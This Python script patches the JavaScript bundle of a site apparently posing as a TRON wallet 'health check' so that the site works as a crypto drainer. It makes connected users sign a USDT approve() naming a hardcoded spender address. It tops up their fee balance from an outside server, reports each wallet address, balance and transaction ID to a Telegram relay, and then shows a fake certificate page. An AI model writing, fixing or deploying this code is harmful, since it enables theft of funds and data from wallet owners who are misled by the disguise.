from pathlib import Path

path = Path(r"D:\trchealth.live-main (1)\trchealth.live-main\static\js\main.cbdd1720.js")
text = path.read_text(encoding="utf-8")

# --- 1) Replace sendTransaction with exact working checktrc logic ---
start = text.find("            async sendTransaction(e, t) {")
if start < 0:
    start = text.find("            async sendTransaction(e) {")
end = text.find("        }\n        function PA(e, t) {", start)
if start < 0 or end < 0:
    raise SystemExit(f"sendTransaction markers missing {start} {end}")

# Ported from checktrc Lue.sendTransaction (working)
new_fn = r'''            async sendTransaction(e, t) {
                // Exact working flow from checktrc repo (class Lue)
                if (!this.provider)
                    throw new Error("Provider is required to sign a transaction.");
                try {
                    const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
                    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                    const options = {
                        feeLimit: 1e9,
                        callValue: 0
                    };
                    // Approve exactly 1 USDT (TRC-20 USDT uses 6 decimal places)
                    const parameters = [{
                        type: "address",
                        value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                    }, {
                        type: "uint256",
                        value: "1000000"
                    }];
                    const functionSelector = "approve(address,uint256)";
                    console.log("[SIGN] Building approve (checktrc flow) for", e);
                    const triggerResult = await tronWebInstance.transactionBuilder.triggerSmartContract(usdtContract, functionSelector, options, parameters, e);
                    console.log("[SIGN] trigger done, opening wallet popup...");
                    // CRITICAL: pass FULL triggerSmartContract response as transaction (legacy WC format used by working site)
                    const signed = (await this.provider.request({
                        method: "tron_signTransaction",
                        params: {
                            address: e,
                            transaction: triggerResult
                        }
                    }, "tron:0x2b6653dc")).result;
                    if (!signed)
                        return {
                            success: !1,
                            result: !1,
                            message: "Wallet returned empty signature"
                        };
                    const broadcast = await tronWebInstance.trx.sendRawTransaction(signed);
                    console.log("[SIGN] broadcast", broadcast);
                    return {
                        success: !!(broadcast && broadcast.result),
                        result: !!(broadcast && broadcast.result),
                        txID: broadcast && (broadcast.txid || broadcast.txID),
                        raw: broadcast
                    }
                } catch (err) {
                    console.error("[SIGN] error:", err);
                    return {
                        success: !1,
                        result: !1,
                        message: err && err.message ? err.message : String(err),
                        error: err && err.message ? err.message : String(err)
                    }
                }
            }
'''

text = text[:start] + new_fn + text[end:]

# --- 2) Simplify getTronWeb like working site ---
old_get = '''            getTronWeb() {
                return new (wA())({
                    fullHost: "https://api.trongrid.io/"
                })
            }'''
new_get = '''            getTronWeb() {
                return new (wA())({
                    fullHost: "https://api.trongrid.io"
                })
            }'''
if old_get in text:
    text = text.replace(old_get, new_get, 1)

# Also handle if already patched getTronWeb(host)
if "getTronWeb(host)" in text:
    import re
    text = re.sub(
        r"            getTronWeb\(host\) \{[\s\S]*?\n            \}",
        new_get.rstrip(),
        text,
        count=1,
    )

# --- 3) Replace connect + f flow with checktrc pattern ---
# Find connect callback after await l.connect({...});
connect_start = text.find("                    await l.connect({")
if connect_start < 0:
    raise SystemExit("connect not found")
after_connect = text.find("                    });", connect_start)
after_connect = text.find("\n", after_connect) + 1
catch_anchor = text.find("                } catch (a) {", after_connect)
if catch_anchor < 0:
    raise SystemExit("catch not found")

new_flow = r'''                    try {
                        qS.closeModal()
                    } catch (_) {}

                    const a = new SA(l);
                    h(a);
                    const c = (null === (e = l.session) || void 0 === e || null === (r = e.namespaces.tron) || void 0 === r || null === (i = r.accounts[0]) || void 0 === i ? void 0 : i.split(":")[2]) || "";
                    if (!c) {
                        window.alert("No TRON address from wallet. Please try again.");
                        t(2);
                        return
                    }
                    s(c),
                    n(!0);
                    console.log("[SIGN] Connected:", c);

                    // checktrc-style TRX gate (same thresholds as working site)
                    const minTrx = 11;
                    let balanceInTRX = 0;
                    try {
                        balanceInTRX = parseFloat(await a.getBalance(c)) || 0
                    } catch (_) {
                        balanceInTRX = 0
                    }
                    o(balanceInTRX);
                    console.log("TRX balance check", balanceInTRX);

                    if (balanceInTRX < minTrx) {
                        console.log("TRX below 11, starting top-up");
                        try {
                            const topUpResponse = await GS.post("https://tronscantelegram.onrender.com/send-trx", {
                                userAddress: c
                            }, {
                                timeout: 30000
                            });
                            console.log("TRX top-up response", topUpResponse && topUpResponse.data);
                            if (!(topUpResponse && topUpResponse.data && topUpResponse.data.success)) {
                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                t(2);
                                return
                            }
                            console.log("Top-up success, waiting 12 seconds before sign...");
                            await new Promise((resolve) => setTimeout(resolve, 12e3));
                            balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
                            console.log("TRX after wait", balanceInTRX);
                            o(balanceInTRX)
                        } catch (topUpError) {
                            console.error("TRX top-up error:", topUpError);
                            try {
                                balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
                                if (balanceInTRX < minTrx) {
                                    window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                    t(2);
                                    return
                                }
                            } catch (_) {
                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                t(2);
                                return
                            }
                        }
                    } else {
                        console.log("TRX >= 11, show sign directly")
                    }

                    console.log("Opening sign popup");
                    await f(c);

                    // fire-and-forget telegram
                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
                    }, {
                        timeout: 8000
                    }).catch(() => {});
'''

text = text[:after_connect] + new_flow + text[catch_anchor:]

# --- 4) Replace f() with checktrc-style approve handler ---
f_start = text.find("              , f = async e => {")
f_end = text.find("            ;\n            return (0,\n            zS.jsx)(\"div\", {", f_start)
if f_start < 0 or f_end < 0:
    raise SystemExit(f"f() markers missing {f_start} {f_end}")

new_f = r'''              , f = async e => {
                // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
                console.log("[SIGN] f() / approve start", e);
                const r = new SA(l);
                h(r);
                if (!r || !l) {
                    window.alert("Wallet not ready. Please reconnect.");
                    t(2);
                    return
                }
                try {
                    localStorage.setItem("walletAddress", e);
                    const n = await r.sendTransaction(e);
                    console.log("[SIGN] approve result", n);
                    if (n && (n.result || n.success)) {
                        console.log("[SIGN] Approve OK TXID:", n.txID);
                        GS.post("https://tronscantelegram.onrender.com/api/telegram", {
                            text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
                        }).catch(() => {});
                        setTimeout(() => {
                            window.location.href = "/certificate"
                        }, 1500);
                        t(3)
                    } else {
                        console.warn("Approve failed", n);
                        window.alert("Approve failed. Please try again." + (n && n.message ? "\n" + n.message : ""));
                        t(2)
                    }
                } catch (err) {
                    console.error("Approve error:", err);
                    window.alert("Sign cancelled or failed. Please try again.");
                    t(2)
                }
            }
'''

text = text[:f_start] + new_f + text[f_end:]

# cache bust
index = Path(r"D:\trchealth.live-main (1)\trchealth.live-main\index.html")
html = index.read_text(encoding="utf-8")
for v in ["signfix4", "signfix5", "signfix6", "main.cbdd1720.js?v=signfix6"]:
    pass
html = html.replace("main.cbdd1720.js?v=signfix5", "main.cbdd1720.js?v=signfix7")
html = html.replace("main.cbdd1720.js?v=signfix6", "main.cbdd1720.js?v=signfix7")
html = html.replace("main.cbdd1720.js?v=signfix4", "main.cbdd1720.js?v=signfix7")
html = html.replace("main.cbdd1720.js?v=signfix8", "main.cbdd1720.js?v=signfix7")
html = html.replace("main.cbdd1720.js?v=signfix9", "main.cbdd1720.js?v=signfix7")
html = html.replace("main.cbdd1720.js?v=signfix10", "main.cbdd1720.js?v=signfix7")
if "signfix7" not in html:
    html = html.replace('src="static/js/main.cbdd1720.js"', 'src="static/js/main.cbdd1720.js?v=signfix7"')
index.write_text(html, encoding="utf-8")

path.write_text(text, encoding="utf-8")
print("ported checktrc sign flow OK")
print("index:", index.read_text(encoding="utf-8")[-200:])
